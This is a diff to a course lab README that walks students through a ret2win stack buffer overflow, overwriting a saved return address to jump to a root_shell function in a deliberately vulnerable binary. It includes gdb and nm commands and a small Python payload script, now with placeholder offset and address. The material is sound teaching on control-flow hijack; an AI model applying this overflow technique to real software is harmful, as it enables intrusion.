@@ -21,9 +21,9 @@ You do **not** edit `vulnerable.c`. You craft the input payload.
 ## Idea
 
 ```text
-buffer[64] | saved EBP (4) | saved return address (4)
-                         overwrite this ----------^
-                         with &root_shell
+buffer[64] | saved EBP / padding | saved return address
+                                  overwrite this ----------^
+                                  with &root_shell
 ```
 
 When `vulnerable()` returns, the CPU jumps to `root_shell()` instead of back
@@ -35,32 +35,34 @@ to `main`.
 
 ```bash
 make
-file vulnerable
+file vulnerable      # ELF 32-bit ... Intel 80386
 ```
+
+**Read the compiler warnings.** Level 3 does **not** use `-z execstack`
+(you jump to existing code, not code on the stack).
 
 ## Step 2 — Find `root_shell`
 
 ```bash
-gdb -q -batch -ex "info address root_shell" ./vulnerable
-```
-
-Or:
-
-```bash
 nm vulnerable | grep root_shell
+# or
+gdb -q -batch -ex "info address root_shell" ./vulnerable
 ```
 
 ## Step 3 — Find the offset
 
-With `buffer[64]` plus compiler frame/alignment padding, the measured offset
-on the course Docker image is:
+With `buffer[64]` plus frame/alignment padding, the offset is often a bit
+above `64 + 4`. **Measure on your VM:**
 
-```text
-offset to return address = 76
+```bash
+gdb ./vulnerable
+(gdb) break vulnerable
+(gdb) run
+(gdb) print &buffer
+(gdb) info frame
 ```
 
-Fill 76 bytes, then write the 4-byte little-endian address of `root_shell`.
-(If you change compilers/flags, re-measure — do not trust `64 + 4` blindly.)
+Or use a cyclic pattern and see what lands in EIP when it crashes.
 
 ## Step 4 — Fire the payload
 
@@ -68,8 +70,8 @@ Fill 76 bytes, then write the 4-byte little-endian address of `root_shell`.
 import sys
 import struct
 
-root = 0x08049xxx   # from info address root_shell
-offset = 76
+root = 0xREPLACE_ME   # from nm / gdb
+offset = REPLACE_ME   # measured on YOUR vm
 
 payload = b"A" * offset + struct.pack("<I", root)
 sys.stdout.buffer.write(payload)
@@ -87,14 +89,8 @@ whoami
 exit
 ```
 
-On a real Linux box with ASLR, prefer:
-
-```bash
-setarch "$(uname -m)" -R ./vulnerable
-```
-
-(Function addresses with `-no-pie` stay fixed; ASLR mainly moves the stack,
-which matters less for this ret2win style exploit.)
+On this lab VM you are often already root, so the shell is a root shell.
+The lesson is **control-flow hijack**, not a magical privilege exploit.
 
 ## Step 5 — Submit
 
@@ -110,5 +106,5 @@ which matters less for this ret2win style exploit.)
 - Control flow can be hijacked by overwriting a saved return address.
 - **ret2win / return-to-function** reuses code already in the binary.
 - This still works when the stack is **non-executable** (no shellcode needed).
-- Real systems add more defenses (ASLR, canaries, PIE, RELRO, CFI) because
-  these attacks are exactly why those defenses exist.
+- Real systems add more defenses (ASLR, canaries, PIE, …) because these
+  attacks are exactly why those defenses exist.
